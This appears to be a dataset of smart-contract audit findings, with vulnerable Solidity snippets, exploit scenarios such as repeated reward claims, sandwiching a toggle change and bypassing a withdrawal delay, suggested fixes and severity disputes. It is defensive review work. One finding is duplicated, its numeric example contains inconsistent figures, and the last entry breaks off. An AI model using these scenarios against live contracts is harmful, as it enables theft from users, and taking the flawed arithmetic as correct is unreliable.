Changing hat toggle address can lead to unexpected changes in statusчmediumч```\nfunction changeHatToggle(uint256 _hatId, address _newToggle) external {\n    if (_newToggle == address(0)) revert ZeroAddress();\n\n    _checkAdmin(_hatId);\n    Hat storage hat = _hats[_hatId];\n\n    if (!_isMutable(hat)) {\n        revert Immutable();\n    }\n\n    hat.toggle = _newToggle;\n\n    emit HatToggleChanged(_hatId, _newToggle);\n}\n```\nчChanging the toggle address should not change the current status unless intended to. However, in the event that a contract's toggle status hasn't been synced to local state, this change can accidentally toggle the hat back on when it isn't intended.\nWhen an admin for a hat calls `changeHatToggle()`, the `toggle` address is updated to a new address they entered:\n```\nfunction changeHatToggle(uint256 _hatId, address _newToggle) external {\n    if (_newToggle == address(0)) revert ZeroAddress();\n\n    _checkAdmin(_hatId);\n    Hat storage hat = _hats[_hatId];\n\n    if (!_isMutable(hat)) {\n        revert Immutable();\n    }\n\n    hat.toggle = _newToggle;\n\n    emit HatToggleChanged(_hatId, _newToggle);\n}\n```\n\nToggle addresses can be either EOAs (who must call `setHatStatus()` to change the local config) or contracts (who must implement the `getHatStatus()` function and return the value).\nThe challenge comes if a hat has a toggle address that is a contract. The contract changes its toggle value to `false` but is never checked (which would push the update to the local state). The admin thus expects that the hat is turned off.\nThen, the toggle is changed to an EOA. One would expect that, until a change is made, the hat would remain in the same state, but in this case, the hat defaults back to its local storage state, which has not yet been updated and is therefore set to `true`.\nEven in the event that the admin knows this and tries to immediately toggle the status back to `false`, it is possible for a malicious user to sandwich their transaction between the change to the EOA and the transaction to toggle the hat off, making use of a hat that should be off. This could have dramatic consequences when hats are used for purposes such as multisig signing.ч"The `changeHatToggle()` function needs to call `checkHatToggle()` before changing over to the new toggle address, to ensure that the latest status is synced up.\nDiscussion\nspengrah\nThe risk here is limited since toggle modules are treated as the source of truth for hat status and so admins should be aware that changing the toggle also changes the source of truth. But the recommended fix is simple and cheap enough that it makes sense to apply.\n@zobront, does this same concept apply to eligibility?\nzobront\n@spengrah Agreed. The only situation I think would break a user's assumption is a change from contract => EOA, because in most cases the toggle will be saved in `hat.config` (so they won't need to take any action), but in this edge case it will be reset to an old version. That inconsistent behavior is the root of the problem.\nThe same is true with `eligibility`, but not sure if there's anything you can do about it, because it's on an individual hat by hat basis. If the `eligibility` contract is changed, you can't go through all the hats and update them. So my advice is just to be sure to document it very clearly in this case.\nspengrah\nhttps://github.com/Hats-Protocol/hats-protocol/pull/116\ncducrest\nEscalate for 10 USDC\nDisagree with being sever enough for being a medium. The Sherlock doc state ""The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team."" However, as was explained, this problem is present both for `status` and `eligibility`, and a fix is possible and implemented in https://github.com/Hats-Protocol/hats-protocol/pull/116 only for `status`, proving that the risk is acceptable for the `eligibility` part thus acceptable for the `status` part.\nAs noted in the comment by spengrah, the fix was implemented mostly because it is not expensive to do so, even though the risk is limited.\nsherlock-admin\nEscalate for 10 USDC\nDisagree with being sever enough for being a medium. The Sherlock doc state ""The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team."" However, as was explained, this problem is present both for `status` and `eligibility`, and a fix is possible and implemented in https://github.com/Hats-Protocol/hats-protocol/pull/116 only for `status`, proving that the risk is acceptable for the `eligibility` part thus acceptable for the `status` part.\nAs noted in the comment by spengrah, the fix was implemented mostly because it is not expensive to do so, even though the risk is limited.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nhrishibhat\nEscalation rejected\nThe issue is a valid medium Given the edge case that the attack is still possible and can cause a hat to be activated which should not be and vice versa.\nsherlock-admin\nEscalation rejected\nThe issue is a valid medium Given the edge case that the attack is still possible and can cause a hat to be activated which should not be and vice versa.\nThis issue's escalations have been rejected!\nWatsons who escalated this issue will have their escalation amount deducted from their next payout."чHats may unexpectedly be toggled from `off` to `on` during toggle address transfer, reactivating hats that are intended to be turned `off`.\nCode Snippet\nTool used\nManual Review
fund loss because calculated Interest would be 0 in getCurrentState() due to division errorчmediumч```\n // 2. Get the time passed since the last interest accrual\n        uint _timeDelta = block.timestamp - _lastAccrueInterestTime;\n        \n        // 3. If the time passed is 0, return the current values\n        if(_timeDelta == 0) return (_currentTotalSupply, _accruedFeeShares, _currentCollateralRatioMantissa, _currentTotalDebt);\n        \n        // 4. Calculate the supplied value\n        uint _supplied = _totalDebt + _loanTokenBalance;\n        // 5. Calculate the utilization\n        uint _util = getUtilizationMantissa(_totalDebt, _supplied);\n\n        // 6. Calculate the collateral ratio\n        _currentCollateralRatioMantissa = getCollateralRatioMantissa(\n            _util,\n            _lastAccrueInterestTime,\n            block.timestamp,\n            _lastCollateralRatioMantissa,\n            COLLATERAL_RATIO_FALL_DURATION,\n            COLLATERAL_RATIO_RECOVERY_DURATION,\n            MAX_COLLATERAL_RATIO_MANTISSA,\n            SURGE_MANTISSA\n        );\n\n        // 7. If there is no debt, return the current values\n        if(_totalDebt == 0) return (_currentTotalSupply, _accruedFeeShares, _currentCollateralRatioMantissa, _currentTotalDebt);\n\n        // 8. Calculate the borrow rate\n        uint _borrowRate = getBorrowRateMantissa(_util, SURGE_MANTISSA, MIN_RATE, SURGE_RATE, MAX_RATE);\n        // 9. Calculate the interest\n        uint _interest = _totalDebt * _borrowRate * _timeDelta / (365 days * 1e18); // does the optimizer optimize this? or should it be a constant?\n        // 10. Update the total debt\n        _currentTotalDebt += _interest;\n```\nчfunction `getCurrentState()` Gets the current state of pool variables based on the current time and other functions use it to update the contract state. it calculates interest accrued for debt from the last timestamp but because of the division error in some cases the calculated interest would be 0 and it would cause borrowers to pay no interest.\nThis is part of `getCurrentState()` code that calculates interest:\n```\n // 2. Get the time passed since the last interest accrual\n        uint _timeDelta = block.timestamp - _lastAccrueInterestTime;\n        \n        // 3. If the time passed is 0, return the current values\n        if(_timeDelta == 0) return (_currentTotalSupply, _accruedFeeShares, _currentCollateralRatioMantissa, _currentTotalDebt);\n        \n        // 4. Calculate the supplied value\n        uint _supplied = _totalDebt + _loanTokenBalance;\n        // 5. Calculate the utilization\n        uint _util = getUtilizationMantissa(_totalDebt, _supplied);\n\n        // 6. Calculate the collateral ratio\n        _currentCollateralRatioMantissa = getCollateralRatioMantissa(\n            _util,\n            _lastAccrueInterestTime,\n            block.timestamp,\n            _lastCollateralRatioMantissa,\n            COLLATERAL_RATIO_FALL_DURATION,\n            COLLATERAL_RATIO_RECOVERY_DURATION,\n            MAX_COLLATERAL_RATIO_MANTISSA,\n            SURGE_MANTISSA\n        );\n\n        // 7. If there is no debt, return the current values\n        if(_totalDebt == 0) return (_currentTotalSupply, _accruedFeeShares, _currentCollateralRatioMantissa, _currentTotalDebt);\n\n        // 8. Calculate the borrow rate\n        uint _borrowRate = getBorrowRateMantissa(_util, SURGE_MANTISSA, MIN_RATE, SURGE_RATE, MAX_RATE);\n        // 9. Calculate the interest\n        uint _interest = _totalDebt * _borrowRate * _timeDelta / (365 days * 1e18); // does the optimizer optimize this? or should it be a constant?\n        // 10. Update the total debt\n        _currentTotalDebt += _interest;\n```\n\ncode should support all the ERC20 tokens and those tokens may have different decimals. also different pools may have different values for MIN_RATE, SURGE_RATE, MAX_RATE. imagine this scenario:\ndebt token is USDC and has 6 digit decimals.\nMIN_RATE is 5% (2 * 1e16) and MAX_RATE is 10% (1e17) and in current state borrow rate is 5% (5 * 1e16)\ntimeDelta is 2 second. (two seconds passed from last accrue interest time)\ntotalDebt is 100M USDC (100 * 1e16).\neach year has about 31M seconds (31 * 1e6).\nnow code would calculate interest as: `_totalDebt * _borrowRate * _timeDelta / (365 days * 1e18) = 100 * 1e6 * 5 * 1e16 * 2 / (31 * 1e16 * 1e18) = 5 * 2 / 31 = 0`.\nso code would calculate 0 interest in each interactions and borrowers would pay 0 interest. the debt decimal and interest rate may be different for pools and code should support all of them.ч
fund loss because calculated Interest would be 0 in getCurrentState() due to division errorчmediumч```\n // 2. Get the time passed since the last interest accrual\n        uint _timeDelta = block.timestamp - _lastAccrueInterestTime;\n        \n        // 3. If the time passed is 0, return the current values\n        if(_timeDelta == 0) return (_currentTotalSupply, _accruedFeeShares, _currentCollateralRatioMantissa, _currentTotalDebt);\n        \n        // 4. Calculate the supplied value\n        uint _supplied = _totalDebt + _loanTokenBalance;\n        // 5. Calculate the utilization\n        uint _util = getUtilizationMantissa(_totalDebt, _supplied);\n\n        // 6. Calculate the collateral ratio\n        _currentCollateralRatioMantissa = getCollateralRatioMantissa(\n            _util,\n            _lastAccrueInterestTime,\n            block.timestamp,\n            _lastCollateralRatioMantissa,\n            COLLATERAL_RATIO_FALL_DURATION,\n            COLLATERAL_RATIO_RECOVERY_DURATION,\n            MAX_COLLATERAL_RATIO_MANTISSA,\n            SURGE_MANTISSA\n        );\n\n        // 7. If there is no debt, return the current values\n        if(_totalDebt == 0) return (_currentTotalSupply, _accruedFeeShares, _currentCollateralRatioMantissa, _currentTotalDebt);\n\n        // 8. Calculate the borrow rate\n        uint _borrowRate = getBorrowRateMantissa(_util, SURGE_MANTISSA, MIN_RATE, SURGE_RATE, MAX_RATE);\n        // 9. Calculate the interest\n        uint _interest = _totalDebt * _borrowRate * _timeDelta / (365 days * 1e18); // does the optimizer optimize this? or should it be a constant?\n        // 10. Update the total debt\n        _currentTotalDebt += _interest;\n```\nчfunction `getCurrentState()` Gets the current state of pool variables based on the current time and other functions use it to update the contract state. it calculates interest accrued for debt from the last timestamp but because of the division error in some cases the calculated interest would be 0 and it would cause borrowers to pay no interest.\nThis is part of `getCurrentState()` code that calculates interest:\n```\n // 2. Get the time passed since the last interest accrual\n        uint _timeDelta = block.timestamp - _lastAccrueInterestTime;\n        \n        // 3. If the time passed is 0, return the current values\n        if(_timeDelta == 0) return (_currentTotalSupply, _accruedFeeShares, _currentCollateralRatioMantissa, _currentTotalDebt);\n        \n        // 4. Calculate the supplied value\n        uint _supplied = _totalDebt + _loanTokenBalance;\n        // 5. Calculate the utilization\n        uint _util = getUtilizationMantissa(_totalDebt, _supplied);\n\n        // 6. Calculate the collateral ratio\n        _currentCollateralRatioMantissa = getCollateralRatioMantissa(\n            _util,\n            _lastAccrueInterestTime,\n            block.timestamp,\n            _lastCollateralRatioMantissa,\n            COLLATERAL_RATIO_FALL_DURATION,\n            COLLATERAL_RATIO_RECOVERY_DURATION,\n            MAX_COLLATERAL_RATIO_MANTISSA,\n            SURGE_MANTISSA\n        );\n\n        // 7. If there is no debt, return the current values\n        if(_totalDebt == 0) return (_currentTotalSupply, _accruedFeeShares, _currentCollateralRatioMantissa, _currentTotalDebt);\n\n        // 8. Calculate the borrow rate\n        uint _borrowRate = getBorrowRateMantissa(_util, SURGE_MANTISSA, MIN_RATE, SURGE_RATE, MAX_RATE);\n        // 9. Calculate the interest\n        uint _interest = _totalDebt * _borrowRate * _timeDelta / (365 days * 1e18); // does the optimizer optimize this? or should it be a constant?\n        // 10. Update the total debt\n        _currentTotalDebt += _interest;\n```\n\ncode should support all the ERC20 tokens and those tokens may have different decimals. also different pools may have different values for MIN_RATE, SURGE_RATE, MAX_RATE. imagine this scenario:\ndebt token is USDC and has 6 digit decimals.\nMIN_RATE is 5% (2 * 1e16) and MAX_RATE is 10% (1e17) and in current state borrow rate is 5% (5 * 1e16)\ntimeDelta is 2 second. (two seconds passed from last accrue interest time)\ntotalDebt is 100M USDC (100 * 1e16).\neach year has about 31M seconds (31 * 1e6).\nnow code would calculate interest as: `_totalDebt * _borrowRate * _timeDelta / (365 days * 1e18) = 100 * 1e6 * 5 * 1e16 * 2 / (31 * 1e16 * 1e18) = 5 * 2 / 31 = 0`.\nso code would calculate 0 interest in each interactions and borrowers would pay 0 interest. the debt decimal and interest rate may be different for pools and code should support all of them.ч
cachedUserRewards variable is never reset, so user can steal all rewardsчhighч```\n            if (rewardDebtDiff > userRewardDebts[msg.sender][rewardToken.token]) {\n                userRewardDebts[msg.sender][rewardToken.token] = 0;\n                cachedUserRewards[msg.sender][rewardToken.token] +=\n                    rewardDebtDiff -\n                    userRewardDebts[msg.sender][rewardToken.token];\n            } else {\n                userRewardDebts[msg.sender][rewardToken.token] -= rewardDebtDiff;\n            }\n```\nчcachedUserRewards variable is never reset, so user can steal all rewards\nWhen user wants to withdraw then `_withdrawUpdateRewardState` function is called. This function updates internal reward state and claims rewards for user if he provided `true` as `claim_` param.\n```\n            if (rewardDebtDiff > userRewardDebts[msg.sender][rewardToken.token]) {\n                userRewardDebts[msg.sender][rewardToken.token] = 0;\n                cachedUserRewards[msg.sender][rewardToken.token] +=\n                    rewardDebtDiff -\n                    userRewardDebts[msg.sender][rewardToken.token];\n            } else {\n                userRewardDebts[msg.sender][rewardToken.token] -= rewardDebtDiff;\n            }\n```\n\nWhen user calls claimRewards, then `cachedUserRewards` variable is added to the rewards he should receive. The problem is that `cachedUserRewards` variable is never reset to 0, once user claimed that amount.\nBecause of that he can claim multiple times in order to receive all balance of token.чOnce user received rewards, reset `cachedUserRewards` variable to 0. This can be done inside `_claimInternalRewards` function.\nDiscussion\n0xLienid\nThis should be high severityчUser can steal all rewards\nCode Snippet\nProvided above\nTool used\nManual Review
Vault can experience long downtime periodsчmediumч```\nreturn (amount_ * stethPerWsteth * stethUsd * decimalAdjustment) / (ohmEth * ethUsd * 1e18);\n```\nчThe chainlink price could stay up to 24 hours (heartbeat period) outside the boundaries defined by `THRESHOLD` but within the chainlink deviation threshold. Deposits and withdrawals will not be possible during this period of time.\nThe `_isPoolSafe()` function checks if the balancer pool spot price is within the boundaries defined by `THRESHOLD` respect to the last fetched chainlink price.\n```\nreturn (amount_ * stethPerWsteth * stethUsd * decimalAdjustment) / (ohmEth * ethUsd * 1e18);\n```\n\n`stethPerWsteth` is mostly stable and changes in `stethUsd` and `ethUsd` will cancel out, so the return value changes will be close to changes in `ohmEth`, so up to 2% from the on-chain trusted price.\nIf `THRESHOLD` < 2%, say 1% as in the tests, then the Chainlink price can deviate by more than 1% from the pool spot price and less than 2% from the on-chain trusted price fro up to 24 h. During this period withdrawals and deposits will revert.ч`THRESHOLD` is not fixed and can be changed by the admin, meaning that it can take different values over time.Only a tight range of values around 2% should be allowed to avoid the scenario above.чWithdrawals and deposits can be often unavailable for several hours.\nCode Snippet\nTool used\nManual Review
SingleSidedLiquidityVault.withdraw will decreases ohmMinted, which will make the calculation involving ohmMinted incorrectчmediumч```\n        ohmMinted -= ohmReceived > ohmMinted ? ohmMinted : ohmReceived;\n        ohmRemoved += ohmReceived > ohmMinted ? ohmReceived - ohmMinted : 0;\n```\nчSingleSidedLiquidityVault.withdraw will decreases ohmMinted, which will make the calculation involving ohmMinted incorrect.\nIn SingleSidedLiquidityVault, ohmMinted indicates the number of ohm minted in the contract, and ohmRemoved indicates the number of ohm burned in the contract. So the contract just needs to increase ohmMinted in deposit() and increase ohmRemoved in withdraw(). But withdraw() decreases ohmMinted, which makes the calculation involving ohmMinted incorrect.\n```\n        ohmMinted -= ohmReceived > ohmMinted ? ohmMinted : ohmReceived;\n        ohmRemoved += ohmReceived > ohmMinted ? ohmReceived - ohmMinted : 0;\n```\n\nConsider that a user minted 100 ohm in deposit() and immediately burned 100 ohm in withdraw().\nIn _canDeposit, the amount_ is less than LIMIT + 1000 instead of LIMIT\n```\n    function _canDeposit(uint256 amount_) internal view virtual returns (bool) {\n        if (amount_ + ohmMinted > LIMIT + ohmRemoved) revert LiquidityVault_LimitViolation();\n        return true;\n    }\n```\n\ngetOhmEmissions() returns 1000 instead of 0\n```\n    function getOhmEmissions() external view returns (uint256 emitted, uint256 removed) {\n        uint256 currentPoolOhmShare = _getPoolOhmShare();\n\n        if (ohmMinted > currentPoolOhmShare + ohmRemoved)\n            emitted = ohmMinted - currentPoolOhmShare - ohmRemoved;\n        else removed = currentPoolOhmShare + ohmRemoved - ohmMinted;\n    }\n```\nч
SingleSidedLiquidityVault._accumulateInternalRewards will revert with underflow error if rewardToken.lastRewardTime is bigger than current timeчmediumч```\n    function _accumulateInternalRewards() internal view returns (uint256[] memory) {\n        uint256 numInternalRewardTokens = internalRewardTokens.length;\n        uint256[] memory accumulatedInternalRewards = new uint256[](numInternalRewardTokens);\n\n\n        for (uint256 i; i < numInternalRewardTokens; ) {\n            InternalRewardToken memory rewardToken = internalRewardTokens[i];\n\n\n            uint256 totalRewards;\n            if (totalLP > 0) {\n                uint256 timeDiff = block.timestamp - rewardToken.lastRewardTime;\n                totalRewards = (timeDiff * rewardToken.rewardsPerSecond);\n            }\n\n\n            accumulatedInternalRewards[i] = totalRewards;\n\n\n            unchecked {\n                ++i;\n            }\n        }\n\n\n        return accumulatedInternalRewards;\n    }\n```\nч"SingleSidedLiquidityVault._accumulateInternalRewards will revert with underflow error if rewardToken.lastRewardTime is bigger than current time\n```\n    function _accumulateInternalRewards() internal view returns (uint256[] memory) {\n        uint256 numInternalRewardTokens = internalRewardTokens.length;\n        uint256[] memory accumulatedInternalRewards = new uint256[](numInternalRewardTokens);\n\n\n        for (uint256 i; i < numInternalRewardTokens; ) {\n            InternalRewardToken memory rewardToken = internalRewardTokens[i];\n\n\n            uint256 totalRewards;\n            if (totalLP > 0) {\n                uint256 timeDiff = block.timestamp - rewardToken.lastRewardTime;\n                totalRewards = (timeDiff * rewardToken.rewardsPerSecond);\n            }\n\n\n            accumulatedInternalRewards[i] = totalRewards;\n\n\n            unchecked {\n                ++i;\n            }\n        }\n\n\n        return accumulatedInternalRewards;\n    }\n```\n\nThe line is needed to see is this `uint256 timeDiff = block.timestamp - rewardToken.lastRewardTime`. In case if `rewardToken.lastRewardTime > block.timestamp` than function will revert and ddos functions that use it.\n```\n    function addInternalRewardToken(\n        address token_,\n        uint256 rewardsPerSecond_,\n        uint256 startTimestamp_\n    ) external onlyRole(""liquidityvault_admin"") {\n        InternalRewardToken memory newInternalRewardToken = InternalRewardToken({\n            token: token_,\n            decimalsAdjustment: 10**ERC20(token_).decimals(),\n            rewardsPerSecond: rewardsPerSecond_,\n            lastRewardTime: block.timestamp > startTimestamp_ ? block.timestamp : startTimestamp_,\n            accumulatedRewardsPerShare: 0\n        });\n\n\n        internalRewardTokens.push(newInternalRewardToken);\n    }\n```\n\nIn case if `startTimestamp_` is in the future, then it will be set and cause that problem. lastRewardTime: block.timestamp > `startTimestamp_` ? block.timestamp : `startTimestamp_`.\nNow till, `startTimestamp_` time, `_accumulateInternalRewards` will not work, so vault will be stopped. And of course, admin can remove that token and everything will be fine. That's why i think this is medium."чSkip token if it's `lastRewardTime` is in future.чSingleSidedLiquidityVault will be blocked\nCode Snippet\nProvided above.\nTool used\nManual Review
claimFees may cause some external rewards to be locked in the contractчmediumч```\n    function _accumulateExternalRewards() internal override returns (uint256[] memory) {\n        uint256 numExternalRewards = externalRewardTokens.length;\n\n        auraPool.rewardsPool.getReward(address(this), true);\n\n        uint256[] memory rewards = new uint256[](numExternalRewards);\n        for (uint256 i; i < numExternalRewards; ) {\n            ExternalRewardToken storage rewardToken = externalRewardTokens[i];\n            uint256 newBalance = ERC20(rewardToken.token).balanceOf(address(this));\n\n            // This shouldn't happen but adding a sanity check in case\n            if (newBalance < rewardToken.lastBalance) {\n                emit LiquidityVault_ExternalAccumulationError(rewardToken.token);\n                continue;\n            }\n\n            rewards[i] = newBalance - rewardToken.lastBalance;\n            rewardToken.lastBalance = newBalance;\n\n            unchecked {\n                ++i;\n            }\n        }\n        return rewards;\n    }\n// rest of code\n    function _updateExternalRewardState(uint256 id_, uint256 amountAccumulated_) internal {\n        // This correctly uses 1e18 because the LP tokens of all major DEXs have 18 decimals\n        if (totalLP != 0)\n            externalRewardTokens[id_].accumulatedRewardsPerShare +=\n                (amountAccumulated_ * 1e18) /\n                totalLP;\n    }\n```\nч"claimFees will update rewardToken.lastBalance so that if there are unaccrued reward tokens in the contract, users will not be able to claim them.\n_accumulateExternalRewards takes the difference between the contract's reward token balance and lastBalance as the reward. and the accumulated reward tokens are updated by _updateExternalRewardState.\n```\n    function _accumulateExternalRewards() internal override returns (uint256[] memory) {\n        uint256 numExternalRewards = externalRewardTokens.length;\n\n        auraPool.rewardsPool.getReward(address(this), true);\n\n        uint256[] memory rewards = new uint256[](numExternalRewards);\n        for (uint256 i; i < numExternalRewards; ) {\n            ExternalRewardToken storage rewardToken = externalRewardTokens[i];\n            uint256 newBalance = ERC20(rewardToken.token).balanceOf(address(this));\n\n            // This shouldn't happen but adding a sanity check in case\n            if (newBalance < rewardToken.lastBalance) {\n                emit LiquidityVault_ExternalAccumulationError(rewardToken.token);\n                continue;\n            }\n\n            rewards[i] = newBalance - rewardToken.lastBalance;\n            rewardToken.lastBalance = newBalance;\n\n            unchecked {\n                ++i;\n            }\n        }\n        return rewards;\n    }\n// rest of code\n    function _updateExternalRewardState(uint256 id_, uint256 amountAccumulated_) internal {\n        // This correctly uses 1e18 because the LP tokens of all major DEXs have 18 decimals\n        if (totalLP != 0)\n            externalRewardTokens[id_].accumulatedRewardsPerShare +=\n                (amountAccumulated_ * 1e18) /\n                totalLP;\n    }\n```\n\nauraPool.rewardsPool.getReward can be called by anyone to send the reward tokens to the contract\n```\n    function getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){\n        uint256 reward = earned(_account);\n        if (reward > 0) {\n            rewards[_account] = 0;\n            rewardToken.safeTransfer(_account, reward);\n            IDeposit(operator).rewardClaimed(pid, _account, reward);\n            emit RewardPaid(_account, reward);\n        }\n\n        //also get rewards from linked rewards\n        if(_claimExtras){\n            for(uint i=0; i < extraRewards.length; i++){\n                IRewards(extraRewards[i]).getReward(_account);\n            }\n        }\n        return true;\n    }\n```\n\nHowever, in claimFees, the rewardToken.lastBalance will be updated to the current contract balance after the admin has claimed the fees.\n```\n    function claimFees() external onlyRole(""liquidityvault_admin"") {\n        uint256 numInternalRewardTokens = internalRewardTokens.length;\n        uint256 numExternalRewardTokens = externalRewardTokens.length;\n\n        for (uint256 i; i < numInternalRewardTokens; ) {\n            address rewardToken = internalRewardTokens[i].token;\n            uint256 feeToSend = accumulatedFees[rewardToken];\n\n            accumulatedFees[rewardToken] = 0;\n\n            ERC20(rewardToken).safeTransfer(msg.sender, feeToSend);\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        for (uint256 i; i < numExternalRewardTokens; ) {\n            ExternalRewardToken storage rewardToken = externalRewardTokens[i];\n            uint256 feeToSend = accumulatedFees[rewardToken.token];\n\n            accumulatedFees[rewardToken.token] = 0;\n\n            ERC20(rewardToken.token).safeTransfer(msg.sender, feeToSend);\n            rewardToken.lastBalance = ERC20(rewardToken.token).balanceOf(address(this));\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n```\n\nConsider the following scenario.\nStart with rewardToken.lastBalance = 200.\nAfter some time, the rewardToken in aura is increased by 100.\nSomeone calls getReward to claim the reward tokens to the contract, and the 100 reward tokens increased have not yet been accumulated via _accumulateExternalRewards and _updateExternalRewardState.\nThe admin calls claimFees to update rewardToken.lastBalance to 290(10 as fees).\nUsers call claimRewards and receives 0 reward tokens. 90 reward tokens will be locked in the contract"ч"Use _accumulateExternalRewards and _updateExternalRewardState in claimFees to accrue rewards.\n```\n    function claimFees() external onlyRole(""liquidityvault_admin"") {\n        uint256 numInternalRewardTokens = internalRewardTokens.length;\n        uint256 numExternalRewardTokens = externalRewardTokens.length;\n\n        for (uint256 i; i < numInternalRewardTokens; ) {\n            address rewardToken = internalRewardTokens[i].token;\n            uint256 feeToSend = accumulatedFees[rewardToken];\n\n            accumulatedFees[rewardToken] = 0;\n\n            ERC20(rewardToken).safeTransfer(msg.sender, feeToSend);\n\n            unchecked {\n                // Add the line below\n// Add the line below\ni;\n            }\n        }\n// Add the line below\n       uint256[] memory accumulatedExternalRewards = _accumulateExternalRewards();\n        for (uint256 i; i < numExternalRewardTokens; ) {\n// Add the line below\n           _updateExternalRewardState(i, accumulatedExternalRewards[i]);\n            ExternalRewardToken storage rewardToken = externalRewardTokens[i];\n            uint256 feeToSend = accumulatedFees[rewardToken.token];\n\n            accumulatedFees[rewardToken.token] = 0;\n\n            ERC20(rewardToken.token).safeTransfer(msg.sender, feeToSend);\n            rewardToken.lastBalance = ERC20(rewardToken.token).balanceOf(address(this));\n\n            unchecked {\n                // Add the line below\n// Add the line below\ni;\n            }\n        }\n    }\n```\n\nDiscussion\nIAm0x52\nEscalate for 25 USDC.\nThis should be medium for two reasons:\nFunds aren't actually lost because they can be rescued\nThis is an admin only function so unless admin was malicious and called this repeatedly the amount of locked tokens would be small\nsherlock-admin\nEscalate for 25 USDC.\nThis should be medium for two reasons:\nFunds aren't actually lost because they can be rescued\nThis is an admin only function so unless admin was malicious and called this repeatedly the amount of locked tokens would be small\nYou've created a valid escalation for 25 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nthereksfour\nEscalate for 25 USDC. Disagree with @IAm0x52 's comments\n1.Funds aren't actually lost because they can be rescued\nFor users, they have lost the rewards they deserve, and even though they can get a refund afterwards, the reputation of the protocol has been compromised.\n2.This is an admin only function so unless admin was malicious and called this repeatedly the amount of locked tokens would be small.\nUsing minimum impact to downgrade the issue here doesn't hold water. I could say that a large number of rewards are left in aura due to a long period of no user activity, and when a malicious user observes the owner calling claimFees, he can preempt the call to getReward to make a large number of rewards locked in the contract\nsherlock-admin\nEscalate for 25 USDC. Disagree with @IAm0x52 's comments\n1.Funds aren't actually lost because they can be rescued\nFor users, they have lost the rewards they deserve, and even though they can get a refund afterwards, the reputation of the protocol has been compromised.\n2.This is an admin only function so unless admin was malicious and called this repeatedly the amount of locked tokens would be small.\nUsing minimum impact to downgrade the issue here doesn't hold water. I could say that a large number of rewards are left in aura due to a long period of no user activity, and when a malicious user observes the owner calling claimFees, he can preempt the call to getReward to make a large number of rewards locked in the contract\nYou've created a valid escalation for 25 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nhrishibhat\nEscalation accepted\nThis is a valid medium There are multiple reasons why this issue should be medium, While there is still a dos attack possible, funds are not lost. And can be recovered by admin. Also, the claimFees is an admin function. This does not break the core functionality but a DOS of rewards. Hence medium is fair\nsherlock-admin\nEscalation accepted\nThis is a valid medium There are multiple reasons why this issue should be medium, While there is still a dos attack possible, funds are not lost. And can be recovered by admin. Also, the claimFees is an admin function.\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue."чIt will cause some external rewards to be locked in the contract\nCode Snippet\nTool used\nManual Review
Protection sellers can bypass withdrawal delay mechanism and avoid losing funds when loans are defaulted by creating withdrawal request in each cycleчhighч```\n  function _requestWithdrawal(uint256 _sTokenAmount) internal {\n    uint256 _sTokenBalance = balanceOf(msg.sender);\n    if (_sTokenAmount > _sTokenBalance) {\n      revert InsufficientSTokenBalance(msg.sender, _sTokenBalance);\n    }\n\n    /// Get current cycle index for this pool\n    uint256 _currentCycleIndex = poolCycleManager.getCurrentCycleIndex(\n      address(this)\n    );\n\n    /// Actual withdrawal is allowed in open period of cycle after next cycle\n    /// For example: if request is made in at some time in cycle 1,\n    /// then withdrawal is allowed in open period of cycle 3\n    uint256 _withdrawalCycleIndex = _currentCycleIndex + 2;\n\n    WithdrawalCycleDetail storage withdrawalCycle = withdrawalCycleDetails[\n      _withdrawalCycleIndex\n    ];\n\n    /// Cache existing requested amount for the cycle for the sender\n    uint256 _oldRequestAmount = withdrawalCycle.withdrawalRequests[msg.sender];\n    withdrawalCycle.withdrawalRequests[msg.sender] = _sTokenAmount;\n\n    unchecked {\n      /// Update total requested withdrawal amount for the cycle considering existing requested amount\n      if (_oldRequestAmount > _sTokenAmount) {\n        withdrawalCycle.totalSTokenRequested -= (_oldRequestAmount -\n          _sTokenAmount);\n      } else {\n        withdrawalCycle.totalSTokenRequested += (_sTokenAmount -\n          _oldRequestAmount);\n      }\n    }\n\n    emit WithdrawalRequested(msg.sender, _sTokenAmount, _withdrawalCycleIndex);\n  }\n```\nчTo prevent protection sellers from withdrawing fund immediately when protected lending pools are defaults, there is withdrawal delay mechanism, but it's possible to bypass it by creating withdraw request in each cycle by doing so user can withdraw in each cycle's open state. there is no penalty for users when they do this or there is no check to avoid this.\nThis is `_requestWithdrawal()` code:\n```\n  function _requestWithdrawal(uint256 _sTokenAmount) internal {\n    uint256 _sTokenBalance = balanceOf(msg.sender);\n    if (_sTokenAmount > _sTokenBalance) {\n      revert InsufficientSTokenBalance(msg.sender, _sTokenBalance);\n    }\n\n    /// Get current cycle index for this pool\n    uint256 _currentCycleIndex = poolCycleManager.getCurrentCycleIndex(\n      address(this)\n    );\n\n    /// Actual withdrawal is allowed in open period of cycle after next cycle\n    /// For example: if request is made in at some time in cycle 1,\n    /// then withdrawal is allowed in open period of cycle 3\n    uint256 _withdrawalCycleIndex = _currentCycleIndex + 2;\n\n    WithdrawalCycleDetail storage withdrawalCycle = withdrawalCycleDetails[\n      _withdrawalCycleIndex\n    ];\n\n    /// Cache existing requested amount for the cycle for the sender\n    uint256 _oldRequestAmount = withdrawalCycle.withdrawalRequests[msg.sender];\n    withdrawalCycle.withdrawalRequests[msg.sender] = _sTokenAmount;\n\n    unchecked {\n      /// Update total requested withdrawal amount for the cycle considering existing requested amount\n      if (_oldRequestAmount > _sTokenAmount) {\n        withdrawalCycle.totalSTokenRequested -= (_oldRequestAmount -\n          _sTokenAmount);\n      } else {\n        withdrawalCycle.totalSTokenRequested += (_sTokenAmount -\n          _oldRequestAmount);\n      }\n    }\n\n    emit WithdrawalRequested(msg.sender, _sTokenAmount, _withdrawalCycleIndex);\n  }\n```\n\nAs 